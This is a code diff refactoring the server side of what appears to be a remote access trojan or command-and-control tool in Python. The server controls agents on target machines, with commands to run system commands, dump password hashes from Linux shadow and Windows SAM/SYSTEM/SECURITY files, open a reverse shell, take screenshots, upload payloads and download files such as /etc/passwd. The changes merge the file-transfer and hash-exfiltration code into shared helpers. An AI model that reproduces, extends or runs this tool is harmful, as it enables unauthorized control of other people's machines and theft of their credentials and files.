@@ -1,12 +1,9 @@
 import socket, threading, ssl
 import secrets, os, platform, json
-import sys
-
 from agent import Agent
 from symbols import *
 import select, datetime
 from prompt_toolkit import PromptSession
-import platform
 
 class Server:
                                                                       
@@ -56,7 +53,7 @@ class Server:
             },
             'exec': {
                 'function': self.exec,
-                'description': 'Execute a system command in local'
+                'description': 'Execute a system command in the local machine'
             }
         }
 
@@ -67,7 +64,7 @@ class Server:
             },
             'hashdump': {
                 'function': self.hashdump,
-                'description': 'Dump the hashes from the target'
+                'description': 'Dump the hashes from the target (may crash on Windows)'
             },
             'search': {
                 'function': self.search,
@@ -79,7 +76,7 @@ class Server:
             },
             'shell': {
                 'function': self.shell,
-                'description': 'Open a reverse shell from the selected agent (type exit to quit the shell)'
+                'description': 'Open a reverse shell from the selected agent (type exit to quit the shell) (not interactive)'
             },
             'screenshot': {
                 'function': self.screenshot,
@@ -266,40 +263,52 @@ class Server:
             print("Please select at least one remote file to download\n\tEx: download /etc/passwd")
             return
         for file_path in args:
-            file = os.path.basename(file_path)
-            with open(file, 'w+b') as f:
-                while True:
-                    data = self.current_agent.sock.recv(1024)
-                    decoded_data = data.decode("latin1")
-                    if (data == SIG_EOF) or (not data):
-                        break
-                    if (data == FILE_NOT_FOUND):
-                        print(decoded_data)
-                        os.remove(file)
-                        return
-                    f.write(data)
-            slash = ""
-            if self.platform == 'Linux':
-                slash = '/'
-            else:
-                slash = '\\'
-            print(f'File saved at {os.getcwd()}{slash}{file}')
-    
+            self.get_file(file_path)
+
+    def send_file(self, file_path):
+        try:
+            with open(file_path, 'rb') as f:
+                while (chunk := f.read(1024)):
+                    self.current_agent.sock.sendall(chunk)
+            self.current_agent.sock.sendall(SIG_EOF)
+            print(f'File sent: {file_path} ({os.path.getsize(file_path)} b)')
+        except Exception:
+            print("File not found")
+            self.current_agent.sock.sendall(FILE_NOT_FOUND)
+
+    def get_file(self, file_path):
+        file = os.path.basename(file_path)
+        file_length = 0
+        with open(file, 'w+b') as f:
+            while True:
+                data = self.current_agent.sock.recv(1024)
+                if (data == SIG_EOF) or (not data):
+                    break
+                if (data == FILE_NOT_FOUND):
+                    print(f"ERROR: {file_path} not found on the target.")
+                    os.remove(file)
+                    return
+                elif (data == ERROR_INSUFFICIENT_PERMS):
+                    print(f"ERROR: Insufficient permissions to get {file}.")
+                    os.remove(file)
+                    return
+                f.write(data)
+                file_length += len(data)
+        slash = ""
+        if self.platform == 'Linux':
+            slash = '/'
+        else:
+            slash = '\\'
+        print(f'File saved at {os.getcwd()}{slash}{file} ({file_length} b)')
+
     def upload(self, args):
         args = list(filter(lambda x: x != "", args.split(" ")))
         if len(args) < 2:
             print("Please select a local file path and a remote path\n\tEx: upload payload.exe C:\\Users\\john\\Desktop\\payload.exe")
             return
         self.current_agent.sock.sendall(f"upload {args[1]}".encode())
-        try:
-            with open(args[0], 'rb') as f:
-                while (chunk := f.read(1024)):
-                    self.current_agent.sock.sendall(chunk)
-            self.current_agent.sock.sendall(SIG_EOF)
-            print("File sent to agent")
-        except Exception:
-            print("File not found")
-            self.current_agent.sock.sendall(FILE_NOT_FOUND)
+        self.send_file(args[0])
+
     
     def isAgentSelected(self):
         if self.current_agent.id != 0:
@@ -345,13 +354,12 @@ class Server:
 
     def hashdump(self, args):
         files = []
-
+        # file names
         shadow_filename = "shadow"
         sam_filename = "sam"
         system_filename = "system"
         security_filename = "security"
-
-
+        # set files to extract based on the OS
         if self.current_agent.os == "Linux":
             files.append(shadow_filename)
         elif self.current_agent.os == "Windows":
@@ -361,29 +369,10 @@ class Server:
         else:
             print("OS not supported")
             return
-
+        # send the command to the agent
         self.current_agent.sock.sendall("hashdump".encode())
-        chunk_size = 1024
         for i in range(len(files)):
-            file_size = 0
-            with open(files[i], 'w+b') as f:
-                while True:
-                    data = self.current_agent.sock.recv(chunk_size)
-                    if (data == SIG_EOF) or (not data):
-                        break
-                    elif (data == ERROR_INSUFFICIENT_PERMS):
-                        print(f"ERROR: Insufficient permissions to dump hashes.")
-                        f.close()
-                        os.remove(files[i])
-                        return
-                    elif (data == FILE_NOT_FOUND):
-                        print(f"ERROR: {files[i]} not found on the target.")
-                        f.close()
-                        os.remove(files[i])
-                        return
-                    f.write(data)
-                    file_size += len(data)
-            print(f'File saved at {files[i]} ({file_size} b)')
+            self.get_file(files[i])
 
     def getAgent(self, id):
         for agent in self.agents:
